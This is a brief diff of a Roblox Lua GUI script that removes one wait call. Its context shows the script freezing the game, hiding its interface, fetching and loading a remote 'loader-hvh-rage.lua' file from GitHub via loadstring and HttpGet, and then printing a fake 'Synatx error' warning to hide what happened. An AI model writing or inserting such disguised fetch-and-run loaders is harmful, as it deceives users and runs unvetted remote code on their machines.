@@ -236,7 +236,6 @@ local script = G2L["14"];
 		wait(3)  -- Wait for the "Done" text to be displayed for 3 seconds
 		induceFreeze(1.4)  -- Freeze the game for 3 seconds
 		script.Parent.main.Visible = false
-		task.wait()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/anarchy-solutions/surge.lol/refs/heads/main/loader-hvh-rage.lua"))
 		task.wait(3)
 		warn("[ERROR HANDLER] Synatx error on line: 3871:21")
